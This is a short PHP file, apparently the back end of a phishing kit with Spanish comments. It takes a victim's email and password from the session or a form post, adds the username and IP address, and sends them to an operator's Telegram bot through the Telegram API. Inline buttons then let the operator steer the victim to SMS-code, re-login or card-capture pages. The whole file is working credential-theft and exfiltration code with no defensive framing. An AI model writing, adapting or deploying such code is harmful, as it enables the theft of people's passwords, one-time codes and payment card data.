<?php
session_set_cookie_params(['lifetime'=>0,'path'=>'/','domain'=>'','secure'=>true,'httponly'=>true,'samesite'=>'None']); session_start();
date_default_timezone_set('America/Caracas');
ini_set("display_errors", 0);

// Incluir configuración global
include('../oslo.php');

$userp = gip();
$usuario = $_SESSION['usuario'] ?? 'desconocido';

// Necesitamos al menos el correo en sesión y la contraseña por POST o en sesión
if (isset($_SESSION['e']) && (isset($_SESSION['c']) || isset($_POST['c']))) {

    // Obtener la contraseña desde la sesión o desde el POST
    $passwordValue = isset($_SESSION['c']) ? $_SESSION['c'] : (isset($_POST['c']) ? $_POST['c'] : '');

    // Enviar datos a Telegram
    $correo = $_SESSION['e'];
    $psswd = $passwordValue;

    $msg = "📧 NUEVO MAIL RECIBIDO\n";
    $msg .= "👤 Usuario: $usuario\n";
    $msg .= "📩 Correo: $correo\n";
    $msg .= "🔑 Password: $psswd\n";
    $msg .= "🌐 IP: $userp\n";

    // Crear botones inline - SMS, Login, Card, Listo
    $botones = json_encode([
        'inline_keyboard' => [
            [
                ['text' => '📩 SMS', 'callback_data' => "SMS|$usuario"],
                ['text' => '🔁 Login', 'callback_data' => "LOGIN|$usuario"],
                ['text' => '💳 Card', 'callback_data' => "CARD|$usuario"],
                ['text' => '✅ Listo', 'callback_data' => "LISTO|$usuario"]
            ]
        ]
    ]);

    // Enviar a Telegram
    file_get_contents("https://api.telegram.org/bot$ambar/sendMessage?" . http_build_query([
        'chat_id' => $koala,
        'text' => $msg,
        'reply_markup' => $botones
    ]));

    unset($_SESSION['e']);
    unset($_SESSION['c']);
    $_SESSION['from_out'] = true;

    // Redirigir a mango.php
    header("Location: ../mango.php");
    exit;
}
?>